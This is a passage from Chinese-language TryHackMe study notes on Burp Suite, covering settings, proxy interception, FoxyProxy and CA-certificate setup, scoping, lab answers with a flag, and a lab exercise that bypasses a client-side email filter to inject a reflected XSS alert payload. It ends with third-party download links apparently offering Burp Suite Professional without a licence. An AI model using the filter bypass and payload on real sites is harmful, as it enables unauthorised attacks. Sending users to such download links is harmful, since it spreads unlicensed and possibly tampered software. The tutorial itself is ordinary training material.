<p>虽然User选项中的用户设置适用于全局(即这些设置能作用于整个Burp Suite——而不仅仅是某个Burp项目)，但是许多用户设置都可以被Project选项中的对应设置所覆盖。</p>
<p>User选项中的常用设置(在较新版本的Burp Suite中不止这些)：</p>
<ul>
<li><p>Connections：这个设置的内容允许我们控制Burp Suite如何连接到目标，例如，我们可以为Burp Suite设置一个代理来连接目标。</p>
</li>
<li><p>TLS：这个设置允许我们启用和禁用各种TLS(传输层安全)选项，并且能够给我们提供一个可以上传客户端证书的地方(如果某个web应用程序需要我们使用证书来建立连接)。</p>
</li>
<li><p>Hotkeys：键盘绑定列表(热键)，此设置可以允许我们查看和更改Burp Suite所使用的键盘快捷键，使用键盘绑定可以大大加快我们的工作流程。</p>
</li>
<li><p>Display：这个设置允许我们改变Burp Suite的外观，包括更改字体大小、为Burp设置主题(如黑暗模式)、是否选择隐藏Learn选项卡以及控制Burp在高分辨率显示器上的外观。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231220235531972.png"
                      alt="image-20231220235531972"
                ></p>
</li>
</ul>
<p>Project 选项中的常用设置(在较新版本的Burp Suite中不止这些)：</p>
<ul>
<li><p>Sessions：此处的设置内容可为我们提供处理会话的选项，它允许我们定义Burp Suite如何获取、保存和使用它从目标站点接收到的会话cookie，它还允许我们定义宏(Macros)，我们可以用这些宏(Macros)来自动化一些事情(比如登录到web应用程序)。</p>
</li>
<li><p>Connections：该设置的作用和User选项中的对应设置类似，并且此部分设置可以覆盖User选项中的对应设置，例如你可以仅为当前项目设置一个代理，这能够覆盖你在User选项中的任何代理设置；此外，此部分内容中还有一些额外选项，例如它包含了”Hostname Resolution-主机名解析”选项(允许你在Burp Suite中将域名映射为IP地址)。</p>
</li>
<li><p>TLS：此部分中的设置内容能够覆盖Burp应用程序范围内的TLS设置，并且可以展示用于我们访问过的站点的一个公共服务器证书列表。</p>
</li>
<li><p>HTTP：此处的设置内容定义了Burp Suite将如何处理HTTP协议的各个方面，例如，是否会跟随重定向或者如何处理不寻常的响应代码。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231220235713841.png"
                      alt="image-20231220235713841"
                ></p>
</li>
</ul>
<h3 id="答题-4"><a href="#答题-4" class="headerlink" title="答题"></a><strong>答题</strong></h3><p>查看Burp Suite社区版界面并回答以下问题：</p>
<p><em><strong>问题1：你可以在哪个类别的设置中找到对”Cookie jar”的引用？</strong></em></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231221000553113.png"
                      alt="image-20231221000553113"
                ></p>
<blockquote>
<p>Sessions</p>
</blockquote>
<p><em><strong>问题2：你可以在哪个基本类别的设置中找到控制Burp Suite更新行为的“Updates”子类别？</strong></em></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231221000649076.png"
                      alt="image-20231221000649076"
                ></p>
<blockquote>
<p>Suite</p>
</blockquote>
<p><em><strong>问题3：允许你更改Burp Suite中快捷键的键盘绑定的子设置类别的名称是什么？</strong></em></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231221000748648.png"
                      alt="image-20231221000748648"
                ></p>
<blockquote>
<p>Hotkeys</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231221000426081.png"
                      alt="image-20231221000426081"
                ></p>
<h2 id="Burp-Proxy-代理-介绍"><a href="#Burp-Proxy-代理-介绍" class="headerlink" title="Burp Proxy(代理)介绍"></a>Burp Proxy(代理)介绍</h2><p>Burp Proxy(代理)是BurpSuite中最基本也是最重要的功能模块，它能够捕获用户客户端和目标Web服务器之间的请求消息和响应消息，然后，我们就可以对这些被拦截的流量进行操作，我们可以将这些数据发送到Burp Suite的其他功能模块做进一步处理，最后我们可以再允许将这些数据继续发往目的地。</p>
<p>例如，如果我们通过Burp Proxy(代理)向<a class="link"   href="https://tryhackme.com发出请求,然后我们的请求将被捕获,在我们明确允许请求消息通过之前,该请求将无法继续发送到tryhackme服务器(我们也可以选择对来自服务器的响应消息执行类似的捕获操作)./" >https://tryhackme.com发出请求，然后我们的请求将被捕获，在我们明确允许请求消息通过之前，该请求将无法继续发送到TryHackMe服务器（我们也可以选择对来自服务器的响应消息执行类似的捕获操作）。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>了解Burp Proxy的要点：</strong></p>
<ul>
<li><p>拦截请求：在开启拦截功能之后，当Web请求经过Burp Proxy发出时，它们将会被拦截并会被阻止到达目标服务器，然后被拦截的请求会出现在Proxy选项卡的界面中，从而允许我们针对其做进一步操作，例如转发、删除、编辑或者将它们发送到其他Burp模块中或者将请求的内容复制为cURL命令并保存为文件；如果你想要禁用拦截功能并允许Web请求能够不间断地通过Proxy，则可以尝试将拦截功能关闭，我们用鼠标左键单击 <code>Intercept is on</code> 按钮即可关闭Proxy的拦截功能。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231221162928614.png"
                      alt="image-20231221162928614"
                ></p>
<p>tips：在Proxy(代理)激活并开启拦截功能之后，我们接着使用浏览器向TryHackMe网站发出一个请求，此时，发出请求的浏览器将会挂起，该请求消息则会出现在Proxy选项卡的界面中，我们可以看到如上图所示的画面。</p>
</li>
<li><p>控制流量：Burp Proxy这种拦截请求的能力使得渗透测试人员能够完全控制与目标服务器相关的网络流量，这对于测试web应用程序来说是非常宝贵的。</p>
</li>
<li><p>捕获和记录：在默认情况下，Burp Suite会捕获并记录通过Proxy发出的请求，即使在关闭拦截状态下也是如此；这种日志记录功能可以帮助我们以后进行内容分析以及审查先前的请求消息。</p>
</li>
<li><p>支持处理WebSocket：Burp Suite还能捕获并记录WebSocket通信，这在我们分析Web应用程序时能够提供额外的帮助。</p>
</li>
<li><p>日志和历史记录：已经捕获的请求消息可以在HTTP history和WebSockets history子选项卡的界面中查看，这能允许我们进行回顾性分析，以便根据需要将已捕获的请求发送到其他Burp功能模块中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231221164222623.png"
                      alt="image-20231221164222623"
                ></p>
</li>
</ul>
<p>我们还可以通过单击Proxy settings按钮(该按钮可以在Proxy选项卡正下方的子选项卡一栏中找到)来访问特定于Proxy功能模块的设置选项，这些选项能够为我们提供对Proxy的行为和功能的广泛控制，熟悉这些设置选项可以帮助我们优化Burp Proxy的使用。</p>
<p><strong>在Proxy Settings中，一些值得注意的功能：</strong></p>
<ul>
<li><p>响应拦截：在默认情况下，Proxy不会主动拦截来自于目标服务器的响应消息，除非我们在每个Web请求的基础上进行明确要求；我们可以使用Proxy设置界面中的”Intercept responses based on the following rules-基于以下规则拦截响应”复选框以及一些已定义的规则来更加灵活地设置响应拦截功能。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231221165316158.png"
                      alt="image-20231221165316158"
                ></p>
<p>tips：我们可以勾选”基于以下规则截取响应”复选框并选择其中的一个或多个规则来覆盖默认设置，例如配置”<code>Or</code> <code>Request</code> <code>Was interrupted</code>“规则，此规则可用于捕获被Proxy拦截的所有请求的相关响应，除了上图的规则配置外，我们也可以制定自己的规则来控制Proxy的操作方式。</p>
</li>
<li><p>匹配和替换：Proxy设置界面中的“匹配和替换”部分允许我们使用正则表达式(regex)来修改传入和传出的Web请求，该功能允许我们进行一些动态更改，修改用户代理或操作cookie等；例如，我们可以自动更改用户代理以便在传出请求中模拟不同的web浏览器，或者删除传入请求中设置的所有cookie，同样，你也可以在这部分设置中使用自定义规则。</p>
</li>
</ul>
<h2 id="配置常规流量代理-FoxyProxy"><a href="#配置常规流量代理-FoxyProxy" class="headerlink" title="配置常规流量代理(FoxyProxy)"></a>配置常规流量代理(FoxyProxy)</h2><p>要使用Burp Suite代理，我们还需要配置本地web浏览器，如此才能尝试通过Burp Suite重定向流量。</p>
<p>在本小节中，我们将重点介绍如何使用Firefox浏览器中的FoxProxy扩展插件来配置Burp代理。</p>
<p>有两种方法可以通过Burp Suite代理我们的常规流量：</p>
<ol>
<li>使用Burp Suite的内置嵌入式浏览器(本小节对此不做赘述)；</li>
<li>配置本地web浏览器，然后通过Burp代理我们的流量(此方法更加常用，本小节主要介绍这种方法)。</li>
</ol>
<p>在本地Kali机中，Burp Proxy（代理）默认会通过在<code>127.0.0.1:8080</code>端口上打开Web界面来开展相关工作，所以，我们需要通过8080端口重定向所有的本地浏览器流量，然后才能开始使用Burp拦截流量；我们可以通过改变浏览器设置来做到这一点，或者使用一个名为<a class="link"   href="https://getfoxyproxy.org/" >FoxyProxy <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>的浏览器扩展进行配置，<a class="link"   href="https://getfoxyproxy.org/" >FoxyProxy <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>插件允许我们保存代理配置文件，这意味着我们可以很方便地切换到我们的”Burp Proxy”配置文件——通过点击勾选代理配置文件，就能快速启用或关闭Burp代理。</p>
<p>FoxyProxy插件有两个版本：基础版和标准版。这两个版本都允许我们更改代理设置，然而，FoxyProxy标准版能够更好地控制什么流量可通过代理发送；例如，标准版的FoxyProxy将允许你设置模式匹配规则来确定某些Web请求是否应该被代理——这比FoxyProxy基础版所提供的简单代理设置要复杂得多。</p>
<p>使用FoxyProxy基础版对我们来说绰绰有余，FoxyProxy是通过<em><strong>Firefox浏览器</strong></em>来安装和配置的，相关的插件下载链接如下：</p>
<blockquote>
<p><a class="link"   href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-basic/" >https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-basic/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://addons.mozilla.org/zh-CN/firefox/addon/foxyproxy-basic/" >https://addons.mozilla.org/zh-CN/firefox/addon/foxyproxy-basic/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>如果想使用谷歌浏览器来完成本小节的代理配置，请使用以下插件(配置方法与在Firefox浏览器中使用FoxyProxy插件类似)：</p>
<blockquote>
<p><a class="link"   href="https://chromewebstore.google.com/detail/padekgcemlokbadohgkifijomclgjgif?hl=zh-CN&utm_source=ext_sidebar" >https://chromewebstore.google.com/detail/padekgcemlokbadohgkifijomclgjgif?hl=zh-CN&amp;utm_source=ext_sidebar <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>以下是在Firefox浏览器中使用 FoxyProxy 配置 Burp Suite 代理(Proxy)的步骤：</p>
<ol>
<li><p>安装 FoxyProxy：下载并安装<a class="link"   href="https://addons.mozilla.org/zh-CN/firefox/addon/foxyproxy-basic/" >FoxyProxy Basic 扩展 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
</li>
<li><p>访问FoxyProxy插件中的选项：在Firefox浏览器中完成插件安装之后，浏览器的界面右上角会出现一个插件图标按钮，这将允许我们访问代理配置(要点击右上角的按钮，才能看到如下界面)：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230408054258418.png"
                      alt="image-20230408054258418"
                ></p>
</li>
<li><p>在FoxyProxy插件中创建 Burp 代理配置：FoxyProxy中没有默认配置(没有可供选择的初始配置)，我们可以点击上图中的”Options-选项”按钮来创建我们的代理配置，这将打开一个新的浏览器选项卡：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230408054445834.png"
                      alt="image-20230408054445834"
                ></p>
</li>
<li><p>添加代理配置的详细信息：接着我们点击上图中的”Add-添加”按钮，并在”Add Proxy”页面填写以下值：</p>
<p>Title：<code>Burp</code>（或者填写其他你想设置的名称）</p>
<p>Proxy Type：<code>HTTP</code></p>
<p>Proxy IP：<code>127.0.0.1</code></p>
<p>Port：<code>8080</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230408055342297.png"
                      alt="image-20230408055342297"
                ></p>
</li>
<li><p>保存配置：单击上图中的“Save保存”按钮以保存我们的 Burp 代理配置(这里的Burp是我们的配置名称，见上图)。</p>
</li>
<li><p>激活插件中的代理配置：现在点击Firefox浏览器顶部的FoxyProxy插件图标，就会看到有一个可用于Burp的配置，如果我们单击勾选下图中的”Burp”配置，那么本地浏览器就可以开始通过<code>127.0.0.1:8080</code>重定向常规流量(注意，当我们激活插件中的”Burp”配置时，Burp Suite必须正在运行状态)。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231221194435130.png"
                      alt="image-20231221194435130"
                ></p>
<p>tips：如果Burp Suite并未启动运行，那么本地浏览器将无法在插件中的”Burp”代理配置激活时发出任何web请求，即FoxyProxy插件中的代理配置选项需要和Burp Suite应用程序中的Proxy模块配合使用。</p>
</li>
<li><p>在 Burp Suite 中启用代理(Proxy)拦截：成功激活浏览器插件中的Burp代理配置选项之后，让我们切换到Burp Suite应用程序中，此时我们要确保Proxy模块中的拦截选项是打开的。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231221194408340.png"
                      alt="image-20231221194408340"
                ></p>
</li>
<li><p>测试代理(Proxy)：现在，当我们尝试在本地Firefox浏览器中访问 <a class="link"   href="http://machine_ip/" >http://MACHINE_IP/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 目标主页时(这会向目标站点发出一个请求)，我们的本地浏览器会被自动挂起，同时我们的代理将填充相关的HTTP请求，最终我们在本地浏览器中发出的Web请求将会被Burp Suite所拦截。</p>
</li>
</ol>
<p>请记住以下几点：</p>
<ul>
<li>当插件中的代理配置激活，并且在Burp Suite中打开了Proxy的拦截选项时，那么无论何时发出Web请求，本地浏览器都会挂起。</li>
<li>注意不要在无意中打开Burp Proxy的拦截选项，因为它会阻止浏览器发出任何请求。</li>
<li>在Burp Suite中右键单击已经被拦截的请求消息时，将允许我们执行各种特定操作，例如转发请求、删除请求以及发送该请求消息到Burp Suite的其他功能模块中等等。</li>
</ul>
<p>注意：在启用Burp中的拦截功能之前，请考虑关闭本地浏览器中的其他网页选项卡，否则我们将在Burp中收到一些并非来自于目标服务器的其他WebSocket请求。</p>
<h3 id="答题-5"><a href="#答题-5" class="headerlink" title="答题"></a><strong>答题</strong></h3><p>在本地Kali机上查看BurpSuite界面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231221195429776.png"
                      alt="image-20231221195429776"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230408061453610.png"
                      alt="image-20230408061453610"
                ></p>
<h2 id="配置HTTPS流量代理"><a href="#配置HTTPS流量代理" class="headerlink" title="配置HTTPS流量代理"></a>配置HTTPS流量代理</h2><p>通过上一小节中的配置，我们已经可以拦截HTTP流量——接下来，我们需要尝试拦截HTTPS流量。</p>
<p>在我们使用Burp Suite拦截HTTP流量时，如果我们导航到启用了TLS(也就是使用了HTTPS协议)的站点会发生什么？例如 <a class="link"   href="https://google.com/" >https://google.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230408062352280.png"
                      alt="image-20230408062352280"
                ></p>
<p>如上图所示，我们会得到一个错误提示，具体而言，Firefox会告诉我们Portswigger证书颁发机构(CA)没有被授权保护此连接。</p>
<p>为了解决上述问题，我们需要让Firefox浏览器信任Portswigger证书有权保护HTTPS连接，因此我们可以手动将此CA证书添加到浏览器的受信任证书颁发机构列表中，操作方法如下：</p>
<ol>
<li><p>下载CA证书：首先，在Burp代理配置激活(未开启拦截功能)的时候访问 <a class="link"   href="http://burp/cert" >http://burp/cert <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，这将下载一个名为<code>cacert.der</code>的文件，我们将此文件保存到计算机上的某个位置。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230408063455946.png"
                      alt="image-20230408063455946"
                ></p>
</li>
<li><p>访问 Firefox 证书设置：在 Firefox URL 栏中输入<code>about:preferences</code>并按下Enter键，这将把我们带到FireFox的设置页面，然后我们再在设置页面中搜索”certificates-证书”，然后单击”View certificates-查看证书”按钮。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230408063727051.png"
                      alt="image-20230408063727051"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230408063750188.png"
                      alt="image-20230408063750188"
                ></p>
</li>
<li><p>导入CA证书：在”Certificate Manager-证书管理器”窗口，单击“Import-导入”按钮，然后选择我们在前述步骤中所下载的<code>cacert.der</code>文件。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230408064739349.png"
                      alt="image-20230408064739349"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230408064716405.png"
                      alt="image-20230408064716405"
                ></p>
</li>
<li><p>设置信任CA证书：在随后出现的窗口中，选中”Trust this CA to identify websites-信任此CA以识别网站”框，然后点击”OK”按钮。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231224114412746.png"
                      alt="image-20231224114412746"
                ></p>
</li>
</ol>
<p>通过完成上述步骤，我们已经将PortSwigger CA证书添加到了受信任的证书颁发机构列表中；现在，我们应该能够访问任何启用TLS的站点，而不会遇到证书错误。</p>
<p>如下图所示，我们现在可以在激活了Burp代理配置(未开启拦截功能)的情况下，自由地访问任何启用了TLS(也就是使用了HTTPS协议)的网站。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230408065356294.png"
                      alt="image-20230408065356294"
                ></p>
<h2 id="Burp-Suite内置浏览器"><a href="#Burp-Suite内置浏览器" class="headerlink" title="Burp Suite内置浏览器"></a>Burp Suite内置浏览器</h2><p>除了修改我们的本地Web浏览器以使用Burp Proxy(代理)之外，Burp Suite还包括了一个内置的Chromium浏览器，该浏览器已经预先配置好能够使用Burp代理，而无需我们再进行任何修改。</p>
<p>我们可以通过Burp Proxy(代理)模块的”Intercept”子选项卡中的”Open Browser-打开浏览器”按钮来启动Burp Suite内置浏览器：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231221205704324.png"
                      alt="image-20231221205704324"
                ></p>
<p>点击”Open Browser-打开浏览器”按钮之后，将会自动弹出一个Chromium窗口，我们在这个浏览器中发出的任何请求都将自动通过Burp Proxy(代理)。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231221205823389.png"
                      alt="image-20231221205823389"
                ></p>
<p>注意：在项目选项和用户选项的设置中有许多与Burp Suite内置浏览器相关的设置，请根据需要探索和定制它们。</p>
<p>如果我们在Linux上以root用户运行Burp Suite，则可能会遇到由于无法创建沙箱环境而导致Burp Suite内置浏览器无法启动的错误。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230408070918316.png"
                      alt="image-20230408070918316"
                ></p>
<p>对此有两个简单的解决方案：</p>
<ul>
<li><p>明智的选择：我们可以在Linux上创建一个新用户，并在低权限帐户下运行Burp Suite，这将允许Burp Browser运行而不会出现问题。</p>
</li>
<li><p>简单的选择：我们可以进入”Settings”-&gt;” Tools”-&gt;”Burp’s browser”，并勾选”Allow Burp’s browser to run without a sandbox-允许Burp’s浏览器在没有沙箱环境的情况下运行”，启用此选项将允许Burp Browser在root用户权限下启动，但请注意，出于安全原因，默认情况下该选项是被禁用的。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231221210956217.png"
                      alt="image-20231221210956217"
                ></p>
</li>
</ul>
<h2 id="Target和Scoping"><a href="#Target和Scoping" class="headerlink" title="Target和Scoping"></a>Target和Scoping</h2><p>本小节我们将查看使用Burp Proxy时的一个很重要的部分——Scoping(范围界定)。</p>
<p>我们可能不需要使用Burp Proxy(代理)来记录浏览器上的所有流量，当选择让Burp记录所有流量内容时会包含很多和目标网站无关的流量信息，这就可能会混淆我们在Burp Suite中所记录的日志内容；简而言之，如果我们只想关注特定的Web应用程序，那么我们应该让Burp Proxy(代理)记录一定范围内的流量而并非全部流量。</p>
<p>因此，在必要的情况下，我们需要使用Scope来控制Burp Proxy对于流量的记录范围。</p>
<p>通过在Burp Suite的项目(Project)设置中修改范围(Scope)，我们可以定义在Burp Suite中代理(Proxy)和记录的内容，从而限制Burp Suite仅针对我们想要测试的特定Web应用程序；相关步骤如下：我们先切换到<code>Target</code>选项卡，右键单击Site map左侧列表中的目标站点，并且选择<code>Add To Scope</code>，然后Burp将提示我们是否要停止记录范围(scope)之外的任何内容——我们选择<code>yes</code>即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231222182632284.png"
                      alt="image-20231222182632284"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231222182739191.png"
                      alt="image-20231222182739191"
                ></p>
<p>现在我们切换到Target选项卡下的”Scope settings”子选项卡中，然后就可以检查流量记录范围(可以看到我们刚才添加的站点)：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231222182843961.png"
                      alt="image-20231222182843961"
                ></p>
<p>如上图所示：Scope settings子选项卡允许我们通过包含或者排除“域名&#x2F;ip地址”来控制Burp Proxy(代理)所记录的流量范围。</p>
<p>我们刚才只是选择禁用范围外流量的日志记录，但是当我们启用Burp代理的拦截功能时，仍然会拦截浏览器中的所有流量；如果要关闭拦截全部流量的功能，我们需要转到Proxy settings子选项卡，然后在”Intercept Client Requests-拦截客户端请求”部分中配置”<code>And</code> <code>URL</code> <code>Is in target scope</code>“规则，这样Burp仅会拦截目标范围内的流量。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231222183331689.png"
                      alt="image-20231222183331689"
                ></p>
<p>按照上图选项成功配置流量拦截规则之后，Burp代理将完全忽略在已定义的范围之外的任何流量内容(既不记录范围外的流量日志，也不拦截范围外的浏览器请求)，从而能在Burp Suite中为我们提供更清晰的流量视图。</p>
<p>tips：我们可以将<code>http://MACHINE_IP/</code>(目标站点)添加到我们的Burp Suite测试范围内，并且更改Burp Suite中的代理(Proxy)设置以实现仅拦截流向范围内目标的流量。</p>
<h2 id="Site-Map和Issue-Definitions"><a href="#Site-Map和Issue-Definitions" class="headerlink" title="Site Map和Issue Definitions"></a>Site Map和Issue Definitions</h2><p>使用Scope settings子选项卡可以控制Burp Suite的测试范围，这可能是Target选项卡中最有用的部分，但是Burp Suite中的Target选项卡不仅仅能提供对测试范围的控制，它一共由三个子选项卡组成：</p>
<ul>
<li><p>Site map(站点地图)： 这个子选项卡允许我们以树形结构绘制目标web应用程序，我们在Burp Proxy处于活动状态时所访问的每个页面都会显示在站点地图的列表中，因此，此功能使我们能够通过简单地浏览Web应用程序的页面来自动生成相关的站点地图；在Burp专业版中，我们还可以使用站点地图来针对目标执行自动爬取，探索页面之间的链接并绘制出尽可能多的网站内容，即使使用的是Burp社区版，我们仍然可以在初始信息枚举时使用站点地图来积累数据；这个功能对于APIs绘制也特别有用，因为目标Web应用程序所访问的任何API端点也都会被捕获并记录在站点地图中。</p>
<p>tips：当我们访问一个页面时，在页面加载过程中用于检索数据的任何API端点都会显示在Site map中。</p>
</li>
<li><p>Issue Definitions(问题定义)：在Burp Suite社区版中，虽然我们无法使用完整的Burp Suite漏洞扫描功能，但是我们仍然可以访问Burp扫描器所能够查找的所有漏洞列表；Issue Definitions子选项卡能够为我们提供一个web漏洞列表(包括漏洞的描述和参考)，如果我们需要书写漏洞报告或者描述在手动测试期间可能已识别的特定漏洞，那么我们就可以从Issue Definitions子选项卡中获得一定帮助。</p>
</li>
<li><p>Scope settings(范围设置)：这个子选项卡能允许我们控制Burp Suite中的目标范围，它使得我们能够包含或排除特定的域名&#x2F;IP以定义我们的测试范围；通过对目标范围进行管理，我们就可以专注于测试我们的目标Web应用程序，而避免捕获过多的、不必要的流量。</p>
</li>
</ul>
<h3 id="答题-6"><a href="#答题-6" class="headerlink" title="答题"></a><strong>答题</strong></h3><p>启动目标机器，在攻击机上激活Burp代理插件并且不启用拦截功能，使用本地浏览器访问目标站点( <a class="link"   href="http://10.10.53.186/" >http://10.10.53.186/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> )的每个页面，然后检查Burp中Target选项卡下的Site map界面(我们想找到一个可疑端点，并想查看其响应消息)：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230408095919709.png"
                      alt="image-20230408095919709"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230408100013480.png"
                      alt="image-20230408100013480"
                ></p>
<blockquote>
<p>找到的flag为：THM{NmNlZTliNGE1MWU1ZTQzMzgzNmFiNWVk} 。</p>
</blockquote>
<p>查看Burp Suite中的Issue Definitions列表(它是Target选项卡下的子选项卡)，找到易受攻击的JavaScript依赖项(Vulnerable JavaScript dependency) 所对应的漏洞严重性：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230408100801502.png"
                      alt="image-20230408100801502"
                ></p>
<blockquote>
<p>严重性为：Low</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230408101245071.png"
                      alt="image-20230408101245071"
                ></p>
<h2 id="实例练习"><a href="#实例练习" class="headerlink" title="实例练习"></a>实例练习</h2><p>在现实世界的web应用程序中，我们会测试目标站点 是否存在各种各样的漏洞，其中一个漏洞就是跨站点脚本(XSS)漏洞。</p>
<p>简单地理解XSS漏洞：如果我们能将一个客户端脚本(通常是Javascript)注入到目标网站的页面中，并且可以执行已注入的脚本，那么目标网站就存在XSS漏洞。</p>
<p>XSS漏洞有很多种——我们在本小节实例中所测试的XSS类型被称为“反射型”XSS，因为它只会影响发出Web请求的用户。</p>
<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a><strong>操作</strong></h3><p>查看目标站点的support页面： <a class="link"   href="http://10.10.53.186/ticket/" >http://10.10.53.186/ticket/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230408101452114.png"
                      alt="image-20230408101452114"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230408101512232.png"
                      alt="image-20230408101512232"
                ></p>
<p>在上图中的”Contact Email”输入框中，输入以下内容：</p>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;Succ3ssful XSS&quot;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p>我们会发现此处有一个过滤器在限制我们的输入内容，该过滤器可以阻止我们添加“任何不允许在电子邮件地址中使用的特殊字符”。</p>
<p>幸运的是，此处的客户端过滤器非常容易绕过，有多种方法可以禁用该过滤器脚本或者我们在一开始就能阻止过滤器脚本加载。</p>
<p>接下来让我们尝试使用Burp Suite来绕过刚才提及的客户端过滤器。</p>
<p>我们打开Burp Suite并启动Burp代理插件，然后开启Burp Proxy中的拦截功能，然后再在浏览器中通过目标站点的Support页面发送请求：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230408103110742.png"
                      alt="image-20230408103110742"
                ></p>
<p>成功捕获到请求后，修改email字段为 <code>&lt;script&gt;alert(&quot;Succ3ssful XSS&quot;)&lt;/script&gt;</code>，然后使用Ctrl + U快捷键对修改之后的内容进行一次URL编码，以使其稍后可以安全地被发送：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230408103801145.png"
                      alt="image-20230408103801145"
                ></p>
<p>我们点击上图中的”Forward”按钮，这将使得浏览器继续向目标站点发送修改之后的请求，如果我们在浏览器页面中得到一个js弹框(代表我们插入的js脚本成功被执行)，那么就说明目标站点确实存在“反射型”XSS漏洞：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230408104254596.png"
                      alt="image-20230408104254596"
                ></p>
<h2 id="小结-Pro版下载链接"><a href="#小结-Pro版下载链接" class="headerlink" title="小结&amp;Pro版下载链接"></a>小结&amp;Pro版下载链接</h2><p>通过学习本文内容，能够很好地掌握Burp Suite的主要界面内容和选项配置，并可以了解Burp Proxy(代理)的基本工作流程。</p>
<p>关于Burp Suite专业版的第三方获取链接如下(验证：52pj)：</p>
<ul>
<li><a class="link"   href="https://www.123pan.com/s/F2W5Vv-Rk7Vv.html" >https://www.123pan.com/s/F2W5Vv-Rk7Vv.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://pan.baidu.com/s/1J_CUxLKqC0h3Ypg4sQV0_g#list/path=%2F" >https://pan.baidu.com/s/1J_CUxLKqC0h3Ypg4sQV0_g#list/path=%2F <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Cross-site Scripting(XSS跨站脚本漏洞)-学习</title>
